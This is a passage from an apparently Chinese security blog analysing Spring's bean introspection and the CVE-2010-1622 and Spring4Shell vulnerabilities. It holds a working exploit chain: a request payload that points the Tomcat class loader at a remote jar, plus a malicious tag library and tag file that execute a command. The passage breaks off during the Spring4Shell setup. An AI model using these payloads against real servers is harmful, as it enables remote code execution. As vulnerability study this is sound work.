+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.lingx5.spring4shell.entry;<br><br><span class="hljs-keyword">import</span> java.beans.BeanInfo;<br><span class="hljs-keyword">import</span> java.beans.Introspector;<br><span class="hljs-keyword">import</span> java.beans.PropertyDescriptor;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">IntrospectorTest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-comment">// 利用Introspector获取User类的BeanInfo信息</span><br>        <span class="hljs-type">BeanInfo</span> <span class="hljs-variable">beanInfo</span> <span class="hljs-operator">=</span> Introspector.getBeanInfo(User.class);<br>        <span class="hljs-comment">// 获取所有的属性描述符，并遍历输出属性名、getter和setter方法</span><br>        <span class="hljs-keyword">for</span> (PropertyDescriptor pd : beanInfo.getPropertyDescriptors()) &#123;<br>            System.out.println(pd.getName()+<span class="hljs-string">&quot;属性的getter和setter方法：&quot;</span>);<br>            System.out.println(pd.getReadMethod());<br>            System.out.println(pd.getWriteMethod());<br>            System.out.println(<span class="hljs-string">&quot;--------------------------------------&quot;</span>);<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>输出的结果</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs text">age属性的getter和setter方法：<br>public int com.lingx5.spring4shell.entry.User.getAge()<br>public void com.lingx5.spring4shell.entry.User.setAge(int)<br>--------------------------------------<br>class属性的getter和setter方法：<br>public final native java.lang.Class java.lang.Object.getClass()<br>null<br>--------------------------------------<br>name属性的getter和setter方法：<br>public java.lang.String com.lingx5.spring4shell.entry.User.getName()<br>public void com.lingx5.spring4shell.entry.User.setName(java.lang.String)<br>--------------------------------------<br>test属性的getter和setter方法：<br>public com.lingx5.spring4shell.entry.User$Test com.lingx5.spring4shell.entry.User.getTest()<br>public void com.lingx5.spring4shell.entry.User.setTest(com.lingx5.spring4shell.entry.User$Test)<br>--------------------------------------<br></code></pre></td></tr></table></figure>
+
+<p>可以看到 <code>User</code> 这个 javaBean 的属性和对应的 getter、setter 方法</p>
+<blockquote>
+<p>这里有一个 class 属性，并且有读方法，这是由于所有类都是 Object 的子类，Object 又拥有 getClass()方法，Java 内省机制认为，只要有 get&#x2F;set 方法中的其中一个，那么就可以找到 class 属性</p>
+<p>class 属性的 getter 和 setter 方法：<br>public final native java.lang.Class java.lang.Object.getClass()<br>null</p>
+</blockquote>
+<h3 id="SpringBean"><a href="#SpringBean" class="headerlink" title="SpringBean"></a>SpringBean</h3><p>springbean 是 spring 框架运行时所管理的对象，可以说只要被 Spring 容器管理，任何类型的 Java 对象都可以是 Spring Bean，但是 springbean 不像 javaBean 一样有严格的限制，满足一下即可</p>
+<ul>
+<li>尽量为每个 Bean 实现类提供无参的构造器</li>
+<li>接受构造注入的 Bean，应该提供对应的构造方法</li>
+<li>接受值注入的 Bean，应该提供对应的 setter 方法，并不强制要求提供对应的 getter 方法</li>
+</ul>
+<p>当然 SpringBean 也有对应的内省机制（<code>BeanWrapperImpl</code>），实际上在 <strong>SpringMVC 参数绑定</strong> 也是依靠内省机制实现的</p>
+<p><strong>BeanWrapperImpl 内省</strong></p>
+<p>BeanWrapperImpl 他相当于是 <code>java.beans.Introspector 内省</code> 的增强，底层使用了 Introspector 机制，但还额外支持了 Spring 类型转换机制、嵌套属性、复杂路径表达式（比如 person.address.city），并且能更好地处理集合&#x2F;数组等特殊类型。</p>
+<p><strong>示例</strong></p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> com.lingx5.spring4shell.entry;<br><br><span class="hljs-keyword">import</span> org.springframework.beans.BeanWrapperImpl;<br><br><span class="hljs-keyword">import</span> java.beans.PropertyDescriptor;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">BeanWrapperTest</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> &#123;<br>        <span class="hljs-type">BeanWrapperImpl</span> <span class="hljs-variable">beanWrapper</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BeanWrapperImpl</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">User</span>());<br>        <span class="hljs-keyword">for</span> (PropertyDescriptor pd : beanWrapper.getPropertyDescriptors()) &#123;<br>            System.out.println(pd.getName()+<span class="hljs-string">&quot;属性的getter和setter方法：&quot;</span>);<br>            System.out.println(pd.getReadMethod());<br>            System.out.println(pd.getWriteMethod());<br>            System.out.println(<span class="hljs-string">&quot;------------------------------&quot;</span>);<br>        &#125;<br>        <span class="hljs-comment">//调用写方法，修改属性值</span><br>        beanWrapper.setPropertyValue(<span class="hljs-string">&quot;name&quot;</span>,<span class="hljs-string">&quot;lingx5&quot;</span>);<br>        beanWrapper.setPropertyValue(<span class="hljs-string">&quot;age&quot;</span>,<span class="hljs-number">20</span>);<br>        System.out.println(beanWrapper.getPropertyValue(<span class="hljs-string">&quot;name&quot;</span>)+<span class="hljs-string">&quot; : &quot;</span>+beanWrapper.getPropertyValue(<br>                <span class="hljs-string">&quot;age&quot;</span>));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>
+
+<p>输出结果</p>
+<figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs text">age属性的getter和setter方法：<br>public int com.lingx5.spring4shell.entry.User.getAge()<br>public void com.lingx5.spring4shell.entry.User.setAge(int)<br>------------------------------<br>class属性的getter和setter方法：<br>public final native java.lang.Class java.lang.Object.getClass()<br>null<br>------------------------------<br>name属性的getter和setter方法：<br>public java.lang.String com.lingx5.spring4shell.entry.User.getName()<br>public void com.lingx5.spring4shell.entry.User.setName(java.lang.String)<br>------------------------------<br>test属性的getter和setter方法：<br>public com.lingx5.spring4shell.entry.User$Test com.lingx5.spring4shell.entry.User.getTest()<br>public void com.lingx5.spring4shell.entry.User.setTest(com.lingx5.spring4shell.entry.User$Test)<br>------------------------------<br>调用了setName方法<br>调用了setAge方法<br>调用了getName方法<br>调用了getAge方法<br>lingx5 : 20<br></code></pre></td></tr></table></figure>
+
+<blockquote>
+<p>BeanWrapperImpl 可以直接调用封装好的 setPropertyValue 和 getPropertyValue 来方便的对 springbean 的属性进行操作</p>
+</blockquote>
+<p>而对于 person.address.city 这样多级嵌套的支持，主要是在 org.springframework.beans.BeanWrapperImpl#getBeanWrapperForPropertyPath 实现的</p>
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250510152758258.png" srcset="/img/loading.gif" lazyload alt="image-20250510152758258"></p>
+<h2 id="CVE-2010-1622"><a href="#CVE-2010-1622" class="headerlink" title="CVE-2010-1622"></a>CVE-2010-1622</h2><p>我们先来看之前爆出的这个漏洞，这个最早披露的该类型的漏洞，因为在 SpringBean 里有 class 属性可以利用内省覆盖对应对的 ClassLoader，可以修改 Tomcat WebappClassLoader 中的 repositoryURLs 让应用程序加载自定义 jar，从而实现命令执行</p>
+<p>影响早期版本的 spring 框架</p>
+<ul>
+<li><p>Spring Framework</p>
+<ul>
+<li>&gt;&#x3D; 2.5.0, &lt;&#x3D; 2.5.6</li>
+<li>&gt;&#x3D; 3.0.0, &lt;&#x3D; 3.0.2</li>
+</ul>
+</li>
+<li><p>Tomcat</p>
+<ul>
+<li>&lt; 6.0.28</li>
+</ul>
+</li>
+</ul>
+<p>环境搭建：用的师傅的 github 项目，<code>https://github.com/l3yx/vuln-debug/spring-framework/CVE-2010-1622</code></p>
+<p>这个公开的 payload 为</p>
+<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-link">http://localhost:8080/user?class.classLoader.URLs</span>[<span class="hljs-string">0</span>]=jar:http://127.0.0.1:8081/springExp.jar!/<br></code></pre></td></tr></table></figure>
+
+<h3 id="jstl"><a href="#jstl" class="headerlink" title="jstl"></a><strong>jstl</strong></h3><p>全称是 JavaServer Pages Standard Tag Library，即 Java 服务器页面标准标签库。他是一组自定义的标签库，当然也可以自定义。这就是我们攻击成功的主要原因，Spring 在渲染 jsp 页面时，会去加载标签库，因为我们在 jar 包中自定义了恶意的标签，在加载解析时触发命令执行</p>
+<h3 id="攻击大致流程"><a href="#攻击大致流程" class="headerlink" title="攻击大致流程"></a><strong>攻击大致流程</strong></h3><ol>
+<li>用 class.classLoader 获得 ClassLoader 类加载器，而在 tomcat 中类加器一般为 org.apache.catalina.loader.WebappClassLoader 它继承了 URLClassLoader 有一个 getURLs() 方法返回 URLs 的数组</li>
+<li>springbean 的内省机制，对于数组不需要 setter 方法也可以修改值，内部是 Array.set() 实现的</li>
+<li>tomcat 的 org.apache.jasper.compiler.TldLocationsCache 会从 WebappClassLoader 里面读取 urls 参数并解析恶意的 TLD 文件，实现 RCE</li>
+</ol>
+<h3 id="springExp-jar"><a href="#springExp-jar" class="headerlink" title="springExp.jar"></a>springExp.jar</h3><p>TldLocationsCache 的主要就是扫描 JAR 包、&#x2F;WEB-INF&#x2F;、&#x2F;META-INF&#x2F; 路径，找到可用的 TLD 文件。</p>
+<blockquote>
+<p>Tomcat 会自动扫描 &#x2F;WEB-INF&#x2F;lib 中所有 JAR 的 &#x2F;META-INF&#x2F;.tld 文件以及 Web 应用程序的 &#x2F;META-INF&#x2F;.tld 文件，以查找自定义标签库描述符。</p>
+</blockquote>
+<p>主要代码</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// 初始化</span><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">init</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> JasperException &#123;<br>    <span class="hljs-keyword">if</span> (!<span class="hljs-built_in">this</span>.initialized) &#123;<br>        <span class="hljs-keyword">try</span> &#123;<br>            <span class="hljs-comment">// 处理 web.xml 配置文件</span><br>            <span class="hljs-built_in">this</span>.processWebDotXml();<br>            <span class="hljs-comment">// 扫描应用依赖的 JAR 包,寻找里面的 TLD文件</span><br>            <span class="hljs-built_in">this</span>.scanJars();<br>            <span class="hljs-comment">// 扫描和处理 /WEB-INF/ 目录下的 TLD 文件</span><br>            <span class="hljs-built_in">this</span>.processTldsInFileSystem(<span class="hljs-string">&quot;/WEB-INF/&quot;</span>);<br>            <span class="hljs-built_in">this</span>.initialized = <span class="hljs-literal">true</span>;<br>        &#125; <span class="hljs-keyword">catch</span> (Exception ex) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JasperException</span>(Localizer.getMessage(<span class="hljs-string">&quot;jsp.error.internal.tldinit&quot;</span>, ex.getMessage()));<br>        &#125;<br>    &#125;<br>&#125;<br><span class="hljs-comment">// 调用了 scanJars()</span><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">scanJars</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>    <span class="hljs-comment">// 从线程获取webappClassLoader</span><br>    <span class="hljs-type">ClassLoader</span> <span class="hljs-variable">webappLoader</span> <span class="hljs-operator">=</span> Thread.currentThread().getContextClassLoader();<br><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">ClassLoader</span> <span class="hljs-variable">loader</span> <span class="hljs-operator">=</span> webappLoader; loader != <span class="hljs-literal">null</span>; loader = loader.getParent()) &#123;<br>        <span class="hljs-keyword">if</span> (loader <span class="hljs-keyword">instanceof</span> URLClassLoader) &#123;<br>            <span class="hljs-comment">// 拿到URL[]数组</span><br>            URL[] urls = ((URLClassLoader)loader).getURLs();<br><br>            <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; urls.length; ++i) &#123;<br>                <span class="hljs-type">URLConnection</span> <span class="hljs-variable">conn</span> <span class="hljs-operator">=</span> urls[i].openConnection();<br>                <span class="hljs-keyword">if</span> (conn <span class="hljs-keyword">instanceof</span> JarURLConnection) &#123;<br>                    <span class="hljs-keyword">if</span> (<span class="hljs-built_in">this</span>.needScanJar(loader, webappLoader, ((JarURLConnection)conn).getJarFile().getName())) &#123;<br>                        <span class="hljs-comment">// 调用scanJar 加载 tld 文件</span><br>                        <span class="hljs-built_in">this</span>.scanJar((JarURLConnection)conn, <span class="hljs-literal">true</span>);<br>                    &#125;<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-type">String</span> <span class="hljs-variable">urlStr</span> <span class="hljs-operator">=</span> urls[i].toString();<br>                    <span class="hljs-keyword">if</span> (urlStr.startsWith(<span class="hljs-string">&quot;file:&quot;</span>) &amp;&amp; urlStr.endsWith(<span class="hljs-string">&quot;.jar&quot;</span>) &amp;&amp; <span class="hljs-built_in">this</span>.needScanJar(loader, webappLoader, urlStr)) &#123;<br>                        <span class="hljs-type">URL</span> <span class="hljs-variable">jarURL</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">URL</span>(<span class="hljs-string">&quot;jar:&quot;</span> + urlStr + <span class="hljs-string">&quot;!/&quot;</span>);<br>                        <span class="hljs-built_in">this</span>.scanJar((JarURLConnection)jarURL.openConnection(), <span class="hljs-literal">true</span>);<br>                    &#125;<br>                &#125;<br>            &#125;<br>        &#125;<br>    &#125;<br><br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+<p>所以我们的 springExp.jar 中肯定就是在 META-INF 目录下自定义 TLD 文件</p>
+<p>目录结构</p>
+<img src="https://gitee.com/ling-x5/img/raw/master/image-20250510123543530.png" srcset="/img/loading.gif" lazyload alt="image-20250510123543530" style="zoom:50%;" />
+
+<p><strong>springform.tld</strong></p>
+<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;<br>&lt;taglib xmlns=<span class="hljs-string">&quot;http://java.sun.com/xml/ns/j2ee&quot;</span><br>    xmlns:xsi=<span class="hljs-string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span> xsi:schemaLocation=<span class="hljs-string">&quot;http://java.sun.com/xml/ns/j2ee http://java.sun.com/xml/ns/j2ee/web-jsptaglibrary_2_0.xsd&quot;</span> version=<span class="hljs-string">&quot;2.0&quot;</span>&gt;<br>    &lt;description&gt;Spring Framework JSP Form Tag Library&lt;/description&gt;<br>    &lt;tlib-version&gt;<span class="hljs-number">3.0</span>&lt;/tlib-version&gt;<br>    &lt;<span class="hljs-type">short</span>-name&gt;form&lt;/<span class="hljs-type">short</span>-name&gt;<br>    &lt;uri&gt;http:<span class="hljs-comment">//www.springframework.org/tags/form&lt;/uri&gt;</span><br>    &lt;tag-file&gt;<br>        &lt;name&gt;input&lt;/name&gt;<br>        &lt;path&gt;/META-INF/tags/InputTag.tag&lt;/path&gt;<br>    &lt;/tag-file&gt;<br>    &lt;tag-file&gt;<br>        &lt;name&gt;form&lt;/name&gt;<br>        &lt;path&gt;/META-INF/tags/InputTag.tag&lt;/path&gt;<br>    &lt;/tag-file&gt;<br>&lt;/taglib&gt;<br></code></pre></td></tr></table></figure>
+
+<p><strong>InputTag.tag</strong></p>
+<figure class="highlight jsp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs jsp">&lt;%@ tag dynamic-attributes=<span class="hljs-string">&quot;dynattrs&quot;</span> %&gt;<br>&lt;%<br>    java.lang.Runtime.getRuntime().exec(<span class="hljs-string">&quot;calc&quot;</span>);<br>%&gt;<br></code></pre></td></tr></table></figure>
+
+<p>可以看到我们自定义的 springform.tld 文件，覆盖了 springMVC 自己的 input 和 form 标签，改为了 <code>/META-INF/tags/InputTag.tag</code> 恶意的标签，当 jsp 渲染的时候会执行恶心代码</p>
+<h3 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h3><p>我们发送开启 http 服务，发送 payload</p>
+<figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-link">http://localhost:8080/demo/test?class.classLoader.URLs</span>[<span class="hljs-string">0</span>]=jar:http://lingx5.dns.army:8000/springExp.jar!/<br></code></pre></td></tr></table></figure>
+
+<p>看到在 org.apache.jasper.compiler.TldLocationsCache#scanJars 中获得的 URLs [] 数组的第 0 个元素被我们改成了恶意的 jar 包地址</p>
+<p><img src="C:/Users/刘德龙/AppData/Roaming/Typora/typora-user-images/image-20250510105828563.png" srcset="/img/loading.gif" lazyload alt="image-20250510105828563"></p>
+<p>成功弹出计算器</p>
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250510123651699.png" srcset="/img/loading.gif" lazyload alt="image-20250510123651699"></p>
+<h3 id="调用栈"><a href="#调用栈" class="headerlink" title="调用栈"></a>调用栈</h3><p><strong>赋值 urls []</strong> </p>
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250510130517681.png" srcset="/img/loading.gif" lazyload alt="image-20250510130517681"></p>
+<p>调用栈</p>
+<figure class="highlight mipsasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs mipsasm"><span class="hljs-symbol">setPropertyValue:</span><span class="hljs-number">1146</span>, <span class="hljs-keyword">BeanWrapperImpl </span>(<span class="hljs-keyword">org.springframework.beans)</span><br><span class="hljs-keyword"></span><span class="hljs-symbol">setPropertyValue:</span><span class="hljs-number">857</span>, <span class="hljs-keyword">BeanWrapperImpl </span>(<span class="hljs-keyword">org.springframework.beans)</span><br><span class="hljs-keyword"></span><span class="hljs-symbol">setPropertyValues:</span><span class="hljs-number">76</span>, AbstractPropertyAccessor (<span class="hljs-keyword">org.springframework.beans)</span><br><span class="hljs-keyword"></span><span class="hljs-symbol">applyPropertyValues:</span><span class="hljs-number">665</span>, DataBinder (<span class="hljs-keyword">org.springframework.validation)</span><br><span class="hljs-keyword"></span><span class="hljs-symbol">doBind:</span><span class="hljs-number">561</span>, DataBinder (<span class="hljs-keyword">org.springframework.validation)</span><br><span class="hljs-keyword"></span><span class="hljs-symbol">doBind:</span><span class="hljs-number">190</span>, WebDataBinder (<span class="hljs-keyword">org.springframework.web.bind)</span><br><span class="hljs-keyword"></span><span class="hljs-keyword">bind:110, </span>ServletRequestDataBinder (<span class="hljs-keyword">org.springframework.web.bind)</span><br></code></pre></td></tr></table></figure>
+
+<p><strong>解析 URLs []</strong></p>
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250510130756902.png" srcset="/img/loading.gif" lazyload alt="image-20250510130756902"></p>
+<p>调用栈</p>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs stylus">scanJars:<span class="hljs-number">504</span>, TldLocationsCache (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.jasper</span>.compiler)<br>init:<span class="hljs-number">244</span>, TldLocationsCache (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.jasper</span>.compiler)<br>getLocation:<span class="hljs-number">219</span>, TldLocationsCache (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.jasper</span>.compiler)<br>getTldLocation:<span class="hljs-number">530</span>, JspCompilationContext (org<span class="hljs-selector-class">.apache</span>.jasper)<br>parseTaglibDirective:<span class="hljs-number">419</span>, Parser (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.jasper</span>.compiler)<br>parseDirective:<span class="hljs-number">476</span>, Parser (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.jasper</span>.compiler)<br>parseElements:<span class="hljs-number">1426</span>, Parser (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.jasper</span>.compiler)<br>parse:<span class="hljs-number">133</span>, Parser (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.jasper</span>.compiler)<br>doParse:<span class="hljs-number">215</span>, ParserController (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.jasper</span>.compiler)<br>parse:<span class="hljs-number">102</span>, ParserController (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.jasper</span>.compiler)<br>generateJava:<span class="hljs-number">167</span>, Compiler (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.jasper</span>.compiler)<br>compile:<span class="hljs-number">306</span>, Compiler (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.jasper</span>.compiler)<br>compile:<span class="hljs-number">286</span>, Compiler (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.jasper</span>.compiler)<br>compile:<span class="hljs-number">273</span>, Compiler (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.jasper</span>.compiler)<br>compile:<span class="hljs-number">566</span>, JspCompilationContext (org<span class="hljs-selector-class">.apache</span>.jasper)<br>service:<span class="hljs-number">308</span>, JspServletWrapper (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.jasper</span>.servlet)<br>serviceJspFile:<span class="hljs-number">320</span>, JspServlet (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.jasper</span>.servlet)<br>service:<span class="hljs-number">266</span>, JspServlet (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.jasper</span>.servlet)<br>service:<span class="hljs-number">803</span>, HttpServlet (javax<span class="hljs-selector-class">.servlet</span>.http)<br>internalDoFilter:<span class="hljs-number">290</span>, ApplicationFilterChain (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.catalina</span>.core)<br>doFilter:<span class="hljs-number">206</span>, ApplicationFilterChain (org<span class="hljs-selector-class">.apache</span><span class="hljs-selector-class">.catalina</span>.core)<br></code></pre></td></tr></table></figure>
+
+<h3 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h3><p>官方在 springbean 的加载时的 CachedIntrospectionResults 加入了对 class.classLoader 的判断</p>
+<p><a target="_blank" rel="noopener" href="https://github.com/spring-projects/spring-framework/compare/v3.0.2.RELEASE..v3.0.3.RELEASE">Comparing v3.0.2.RELEASE..v3.0.3.RELEASE · spring-projects&#x2F;spring-framework</a></p>
+<p><img src="https://gitee.com/ling-x5/img/raw/master/image-20250510132215684.png" srcset="/img/loading.gif" lazyload alt="image-20250510132215684"></p>
+<p>同时 tomcat 也对这个漏洞做了修复</p>
+<p>Tomcat 6.0.28 版本后把 <code>getURLs</code> 方法返回的值改成了 clone 的，也就是说我们即使能绕过 springFramework 的修复，也无法再利用 webappClassLoader 获得并设置 URLs [] 数组，实现远程 jar 包加载的 RCE 了</p>
+<h2 id="CVE-2022-22965（Spring4Shell）"><a href="#CVE-2022-22965（Spring4Shell）" class="headerlink" title="CVE-2022-22965（Spring4Shell）"></a>CVE-2022-22965（Spring4Shell）</h2><p>利用条件：</p>
+<ol>
+<li>JDK 版本：JDK 9 及以上版本</li>
+<li>受影响组件：直接或者间接地使 ⽤ 了 Spring-beans 包（Spring boot 等框架都使用了）</li>
+<li>受影响的版本：Spring Framework &lt; 5.3.18 ，Spring Framework &lt; 5.2.20 及衍生版本</li>
+<li>部署方式：使用 war 包部署于 tomcat（非 spring 的可执行的 jar 文件）</li>
+</ol>
+<p>这其实就是对 CVE-2010-1622 的绕过。</p>
+<p>原因：</p>
+<ul>
+<li>jdk9 以后给 Class 加入了 module 属性，我们可以利用 module 获得 ClassLoader, 也就是可以利用 <code>class.module.classLoader</code> 获得</li>
+</ul>
+<img src="https://gitee.com/ling-x5/img/raw/master/image-20250510160407696.png" srcset="/img/loading.gif" lazyload alt="image-20250510160407696" style="zoom:50%;" />
+
+<img src="https://gitee.com/ling-x5/img/raw/master/image-20250510160439795.png" srcset="/img/loading.gif" lazyload alt="image-20250510160439795" style="zoom:50%;" />
+
+<h3 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h3><p>正常创建一个 springboot2.6.3 的项目, 创建时选择 <code>war</code> 包方式，再配置一下 tomcat 服务器启动即可</p>
+<p>我这里用的 springboot2.6.3 ，jdk11 ，tomcat 8.5.27</p>
+<p>创建项目</p>
+<center>
+    <img src="https://gitee.com/ling-x5/img/raw/master/image-20250510200649208.png" srcset="/img/loading.gif" lazyload alt="image-20250510200649208" style="zoom:40%;" />
+    <img src="https://gitee.com/ling-x5/img/raw/master/image-20250510200803089.png" srcset="/img/loading.gif" lazyload alt="image-20250510200803089" style="zoom:40%;" />
+    </center>
+
+<p>修改一下 pom.xml 文件</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">parent</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">groupId</span>&gt;</span>org.springframework.boot<span class="hljs-tag">&lt;/<span class="hljs-name">groupId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">artifactId</span>&gt;</span>spring-boot-starter-parent<span class="hljs-tag">&lt;/<span class="hljs-name">artifactId</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span class="hljs-name">version</span>&gt;</span>2.6.3<span class="hljs-tag">&lt;/<span class="hljs-name">version</span>&gt;</span><br>    <span class="hljs-tag">&lt;<span 